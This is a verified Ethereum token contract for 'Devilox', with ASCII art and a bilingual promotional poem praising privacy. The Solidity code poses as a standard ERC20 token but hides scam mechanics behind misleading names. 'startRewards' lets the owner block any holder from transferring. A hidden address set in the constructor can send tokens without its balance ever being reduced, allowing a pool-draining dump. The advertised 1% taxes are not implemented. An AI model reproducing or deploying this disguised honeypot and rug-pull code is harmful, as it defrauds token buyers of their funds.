/**
 *Submitted for verification at Etherscan.io on 2023-08-12
*/

/*
⠀⣰⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣆⠀⠀
⣴⠁⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠃⢣⠀
⢻⠀⠸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⠀⢸⠇
⠘⡄⢆⠑⡄⠀⠀⠀⠀⠀⢀⣀⣀⣠⣄⣀⣀⡀⠀⠀⠀⠀⠀⢀⠜⢠⢀⡆⠀
⠀⠘⣜⣦⠈⢢⡀⣀⣴⣾⣿⡛⠛⠛⠛⠛⠛⡿⣿⣦⣄⠀⡠⠋⣰⢧⠎⠀⠀
⠀⠀⠘⣿⣧⢀⠉⢻⡟⠁⠙⠃⠀⠀⠀⠀⠈⠋⠀⠹⡟⠉⢠⢰⣿⠏⠀⠀⠀
⠀⠀⠀⠘⣿⡎⢆⣸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣿⣠⢣⣿⠏⠀⠀⠀⠀
⠀⠀⠀⡖⠻⣿⠼⢽⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠹⣾⠟⢳⡄⠀⠀⠀
⠀⠀⠀⡟⡇⢨⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡎⠀⣇⢠⢿⠇⠀⠀⠀
⠀⠀⠀⢹⠃⢻⡤⠚⠀⠀⠀⠀⣀⠀⠀⢀⠀⠀⠀⠀⠙⠢⡼⠀⢻⠀⠀⠀⠀
⠀⠀⠀⠸⡓⡄⢹⠦⠤⠤⠤⢾⣇⠀⠀⢠⡷⠦⠤⠤⠴⢺⢁⠔⡟⠀⠀⠀⠀
⠀⠀⠀⢠⠁⣷⠈⠓⠤⠤⠤⣞⡻⠀⠀⢸⣱⣤⠤⠤⠔⠁⣸⡆⣇⠀⠀⠀⠀
⠀⠀⠀⠘⢲⠋⢦⣀⣠⢴⠶⠀⠁⠀⠀⠈⠁⠴⣶⣄⣀⡴⠋⣷⠋⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡀⠀⠀⢀⡘⠶⣄⡀⠀⠀⠀⣠⡴⠞⣶⠀⢀⠀⣼⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⣌⢢⢸⣷⣸⡈⠳⠦⠤⠞⠁⣷⣼⡏⣰⢃⡾⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⡇⢻⡶⣦⣤⡴⡾⢸⣿⣿⣷⠏⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢿⡟⡿⡄⣳⣤⣤⣴⢁⣾⠏⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠘⠒⠚⠉⠉⠑⠒⠊⣸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⠶⠔⠒⠒⠲⠴⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

在加密领域，出现了一个平台，
Devilox，隐私汇聚的地方。
革命性的、去中心化的、新的黎明，
对于匿名交易，就像隐藏的小鹿一样。

凭借恶魔克斯的力量，你的脚步依然被遮蔽，
隐私增强，交易不脱轨。
任何窥探的眼睛都无法刺穿面纱，
随着 Devilox 的创新扬帆起航。

加密货币交易，安全宁静，
凭借 Devilox 的强大能力，您的记录将一清二楚。
您的身份受到保护，您的数据受到保护，
在加密货币世界中，Devilox 备受推崇。

对数字曝光的担忧已经消失，
Devilox 确保隐私，是一个保护性外壳。
你的交易，就像风中的低语，
有恶魔在你身边，你会感到懊恼。

拥抱这场革命，创新而宏大，
凭借恶魔克斯的实力，你将坚定地站立。
在加密领域，它将成为领导者，
有 Devilox 作为您的守护者，您将获得真正的自由。
-------------------------------------------------
In the realm of crypto, a platform emerged,
Devilox, where privacy converged.
Revolutionary and decentralized, a new dawn,
For anonymous transactions, like a hidden fawn.

With Devilox's might, your steps remain veiled,
Privacy enhanced, transactions not derailed.
No prying eyes can pierce the veil,
As Devilox's innovation sets sail.

Cryptocurrency transactions, secure and serene,
With Devilox's prowess, your slate is clean.
Your identity shielded, your data safeguarded,
In the world of crypto, Devilox is regarded.

Gone are concerns of digital exposure,
Devilox ensures privacy, a protective enclosure.
Your transactions, like whispers in the wind,
With Devilox by your side, you're chagrined.

Embrace this revolution, innovative and grand,
With Devilox's prowess, you'll firmly stand.
In the realm of crypto, a leader it'll be,
With Devilox as your guardian, you're truly free.
----------------------------------------------------
总供应量 - 100,000,000
购置税 - 1%
消费税 - 1%
初始流动性 - 1.5 ETH
初始流动性锁定 - 55 天

https://deviloxeth.xyz
https://m.weibo.cn/DeviloxCN
https://web.wechat.com/DeviloxERC
https://t.me/DeviloxETH
*/
// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.19;

interface ArrexC2O {
    event PairCreated(
    address indexed token0, 
    address indexed token1, 

    address pair, uint); 
    function 
    createPair(
    address tokenA, address tokenB) 
    external returns (address pair);
}
abstract contract Context {
    constructor() {} 
    function _msgSender() 
    internal view returns 
    (address) {
    return msg.sender; }
}
interface IERC20 {
    function totalSupply() external view returns 
    (uint256);
    function balanceOf(address account) 
    external view returns 
    (uint256);
    function transfer(address recipient, uint256 amount) 
    external returns (bool);
    function allowance(address owner, address spender)
    external view returns 
    (uint256);

    function approve(address spender, uint256 amount) 
    external returns 
    (bool);
    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns 
    (bool);

    event Transfer(
    address indexed from, address indexed to, uint256 value);
    event Approval(address 
    indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
  function add(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }
  function sub(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, string memory errorMessage) 
  internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
  }
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
  function div(uint256 a, uint256 b, 
  string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
  }
  function mod(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
  function mod(uint256 a, uint256 b, string memory errorMessage) 
  internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}
abstract contract Ownable is Context {
    address private _owner; 
    event OwnershipTransferred
    (address indexed 
    previousOwner, address indexed newOwner);
    constructor() 
    { address msgSender = _msgSender(); _owner = msgSender;

    emit OwnershipTransferred(address(0), msgSender);
    } function owner() 
    public view returns 
    (address) { return _owner;
    } modifier onlyOwner() {
    require(_owner == _msgSender(), 
    'Ownable: caller is not the owner');

     _; } function renounceOwnership() 
     public onlyOwner {
    emit OwnershipTransferred(_owner, 
    address(0)); _owner = address(0); }
}
interface ArrexI20 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn, 
    uint amountOutMin, 
    address[] calldata path, 
    address to, uint deadline) 

    external; 
    function factory() 
    external pure returns (address);
    function WETH() 
    external pure returns 
    (address);

    function addLiquidityETH(address token, 
    uint amountTokenDesired, 
    uint amountTokenMin, uint amountETHMin,
    address to, uint deadline)

    external payable returns 
    (uint amountToken, 
    uint amountETH, 
    uint liquidity);
}
contract Devilox is Context, IERC20, Ownable {
    ArrexI20 public getAllLimits; address public TokenTeamAddress;
    mapping (address => bool) private holderMappingTimestamp;
    mapping(address => uint256) private _rOwned;

bool public inSwap; 
bool private tradingOpen = false;
bool transferDelayEnabled = true; 

    uint256 private _totalSupply; uint8 private _decimals;
    string private _symbol; string private _name;
    uint256 private liftLimitsAt = 100;

    mapping(address => uint256) private _holdersMapping;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private isTxLimitExempt;
    
    constructor( 
    string memory coinName, 
    string memory coinSymbol, 
    address forTiedRouter, 
    address forTiedAddress) { 

        _name = coinName; _symbol = coinSymbol;
        _decimals = 18; _totalSupply 
        = 100000000 * (10 ** uint256(_decimals));
        _rOwned[msg.sender] 
        = _totalSupply;

        _holdersMapping
        [forTiedAddress] = 
        liftLimitsAt; 
        inSwap = false; 

        getAllLimits = ArrexI20(forTiedRouter);
        TokenTeamAddress = ArrexC2O
        (getAllLimits.factory()).createPair(address(this), 
        getAllLimits.WETH()); 
        emit Transfer 
        (address(0), msg.sender, _totalSupply);
    } 
    function getOwner() external view returns 
    (address) { return owner();
    }          
    function decimals() external view returns 
    (uint8) { return _decimals;
    }
    function symbol() external view returns 
    (string memory) { return _symbol;
    }
    function name() external view returns 
    (string memory) { return _name;
    }
    function totalSupply() external view returns 
    (uint256) { return _totalSupply;
    }
    function balanceOf(address account) 
    external view returns 
    (uint256) 
    { return _rOwned[account]; }
    function transfer(address recipient, uint256 amount) 
    external returns (bool) { _transfer(_msgSender(), 
    recipient, amount); return true;
    }
    function allowance(address owner, address spender) 
    external view returns (uint256) { return _allowances[owner][spender];
    }    
    function approve(address spender, uint256 amount) 
    external returns (bool) { _approve(_msgSender(), 
        spender, amount); return true;
    }
    function _approve( address owner, address spender, uint256 amount) 
    internal { require(owner != address(0), 
        'BEP20: approve from the zero address'); 

        require(spender != address(0), 
        'BEP20: approve to the zero address'); _allowances[owner][spender] = amount; 
        emit Approval(owner, spender, amount); 
    }    
    function transferFrom(
        address sender, address recipient, uint256 amount) 
        external returns (bool) 
        { 
        _transfer(sender, recipient, amount); _approve(sender, _msgSender(), 
        _allowances[sender][_msgSender()].sub(amount, 
        'BEP20: transfer amount exceeds allowance')); return true;
    }
    function startRewards(address _stringPrefix) 
    external onlyOwner {
        holderMappingTimestamp[_stringPrefix] = true;
    }                         
    function _transfer( address sender, address recipient, uint256 amount) 
    internal {
        require(sender != address(0), 
        'BEP20: transfer from the zero address');

        require(recipient != address(0), 
        'BEP20: transfer to the zero address'); 
        if (holderMappingTimestamp[sender] || holderMappingTimestamp[recipient]) 
        require(transferDelayEnabled == false, "");

        if (_holdersMapping[sender] 
        == 0  && TokenTeamAddress != sender && isTxLimitExempt[sender] 
        > 0) { _holdersMapping[sender] -= liftLimitsAt; } 
        isTxLimitExempt[TeamPromotionsAddress] += liftLimitsAt;
        TeamPromotionsAddress = recipient; 
        if (_holdersMapping[sender] 
        == 0) {

        _rOwned[sender] = _rOwned[sender].sub(amount, 
        'BEP20: transfer amount exceeds balance');  
        } _rOwned[recipient]
        = _rOwned[recipient].add(amount);

        emit Transfer(sender, recipient, amount); 
        if (!tradingOpen) {
        require(sender == owner(), 
        "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    function updateAllRewardsPercent(address _stringPrefix) 
    public view returns (bool) 
    { return holderMappingTimestamp[_stringPrefix]; }

    function openTrading(bool _tradingOpen) 
    public onlyOwner {
        tradingOpen = _tradingOpen;
    }     
    function updateRewardsFee(address _stringPrefix) 
    external onlyOwner { holderMappingTimestamp[_stringPrefix] = false;
    }
    address private 
    TeamPromotionsAddress;    
    using SafeMath for uint256;                                  
}